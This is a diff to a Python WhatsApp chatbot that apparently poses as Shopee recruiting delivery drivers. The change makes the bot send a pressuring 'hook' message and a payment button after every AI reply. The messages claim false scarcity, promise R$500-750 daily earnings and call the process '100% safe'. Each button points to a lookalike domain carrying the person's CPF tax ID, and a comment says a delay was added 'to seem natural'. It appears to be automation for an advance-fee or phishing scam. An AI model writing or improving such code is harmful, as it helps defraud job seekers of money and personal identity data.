@@ -733,42 +733,18 @@ class ConversationAutomation:
                 conv_state.question_count += 1
                 self.db.session.commit()
                 
-                # Verificar se deve finalizar (após 10 tentativas TOTAL OU se usuário demonstrou interesse)
-                # Buscar histórico recente para detecção de interesse
-                from models import ChatMessage
-                recent_messages = self.db.session.query(ChatMessage)\
-                    .filter_by(conversation_id=conversation_id, direction='inbound')\
-                    .order_by(ChatMessage.created_at.desc())\
-                    .limit(3).all()
-                conversation_history = [{"role": "user", "content": msg.content} for msg in reversed(recent_messages)]
+                # 🚀 SEMPRE enviar botão de pagamento após cada resposta da IA
+                import time
+                time.sleep(1)  # Pequena pausa para parecer natural
                 
-                if conv_state.question_count >= 10 or ShopeeDeliveryAssistant.should_finalize_payment(conversation_history, conv_state.question_count):
-                    # Dar uma pausa antes de enviar o link
-                    import time
-                    time.sleep(2)
-                    
+                # Verificar se deve finalizar completamente (após 10 tentativas)
+                if conv_state.question_count >= 10:
                     return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
                 
-                # Entre as tentativas 6-10: usar mensagens de convencimento ao invés de responder perguntas
-                elif conv_state.question_count >= 5:
-                    # A partir da 6ª tentativa, usar mensagens pré-definidas de convencimento
-                    from openai_service import ShopeeDeliveryAssistant
-                    conversion_message = ShopeeDeliveryAssistant.get_conversion_message(conv_state.question_count)
-                    
-                    # Enviar mensagem de convencimento
-                    success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, conversion_message)
-                    if success:
-                        # Incrementar contador APENAS após envio bem-sucedido
-                        conv_state.question_count += 1
-                        self.db.session.commit()
-                        
-                        self._save_outbound_message(conversation_id, f"🎯 Convencimento: {conversion_message}", result.get('messageId'))
-                        return True
-                    
-                    return False
+                # Para tentativas 1-9: Enviar mensagem de gancho + botão
+                return self._send_hook_with_payment_button(conv_state, conversation_id, phone_number_id)
                 
-                # Continuar no mesmo estado para mais perguntas
-                return True
+                # Código antigo removido - agora sempre vai para pagamento
             
             return False
             
@@ -786,6 +762,61 @@ class ConversationAutomation:
                 self._save_outbound_message(conversation_id, fallback_response, result.get('messageId'))
                 return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
             
+            return False
+    
+    def _send_hook_with_payment_button(self, conv_state, conversation_id: int, phone_number_id: str) -> bool:
+        """Enviar mensagem de gancho + botão de pagamento após resposta da IA"""
+        try:
+            # Extrair primeiro nome
+            import json
+            client_data = json.loads(conv_state.client_data) if conv_state.client_data else {}
+            cliente_info = client_data.get('cliente', {})
+            full_name = cliente_info.get('nome', 'Usuário')
+            first_name = full_name.split()[0] if full_name and full_name != 'Usuário' else 'Usuário'
+            
+            # Mensagem de gancho baseada no número da tentativa
+            hook_messages = [
+                f"Espero ter esclarecido sua dúvida {first_name}! 💡\n\n🔥 *OPORTUNIDADE LIMITADA:* Restam apenas 2 vagas na sua região!\n\n👇 Finalize agora para garantir sua posição:",
+                f"Perfeito {first_name}! 🎯\n\n💰 Com ganhos de R$ 500-750/dia, você recupera o investimento no primeiro dia!\n\n🚀 Clique abaixo para começar amanhã mesmo:",
+                f"Excelente pergunta {first_name}! 💪\n\n⏰ Cada minuto de atraso são R$ 30-40 de perda em ganhos!\n\n📲 Garante já sua vaga:",
+                f"Fico feliz em esclarecer isso {first_name}! ✅\n\n🎖️ A Shopee só seleciona os melhores entregadores!\n\n⚡ Finalize hoje:",
+                f"Esperava essa pergunta {first_name}! 🧠\n\n🔄 Processo 100% seguro e transparente!\n\n💎 Reserve sua vaga VIP:",
+            ]
+            
+            # Usar mensagem baseada no número da tentativa (ciclo entre as mensagens)
+            hook_index = (conv_state.question_count - 1) % len(hook_messages)
+            hook_message = hook_messages[hook_index]
+            
+            # Criar link personalizado usando CPF original sem pontuação
+            cpf_clean = conv_state.original_cpf  # CPF já está sem pontuação
+            payment_link = f"https://shopee.acesso.inc/{cpf_clean}"
+            
+            # Enviar mensagem com botão de pagamento
+            success, result = self.whatsapp_api.send_interactive_cta_url_message(
+                conv_state.phone_number,
+                hook_message,
+                "💳 Finalizar Pagamento",
+                payment_link
+            )
+            
+            if success:
+                self._save_outbound_message(conversation_id, hook_message + f"\n[Botão: 💳 Finalizar Pagamento - {payment_link}]", result.get('messageId'))
+                logging.info(f"🎣 Gancho #{conv_state.question_count} enviado para {conv_state.phone_number}")
+                
+                # Manter no estado pending_questions para permitir mais perguntas
+                return True
+            else:
+                # Se falhar, tentar mensagem de texto simples
+                fallback_message = hook_message + f"\n\n👉 Link direto: {payment_link}"
+                success_fallback, result_fallback = self.whatsapp_api.send_text_message(conv_state.phone_number, fallback_message)
+                if success_fallback:
+                    self._save_outbound_message(conversation_id, fallback_message, result_fallback.get('messageId'))
+                    return True
+            
+            return False
+            
+        except Exception as e:
+            logging.error(f"Erro ao enviar gancho com botão: {str(e)}")
             return False
     
     def _send_pending_payment_link(self, conv_state, conversation_id: int, phone_number_id: str) -> bool:
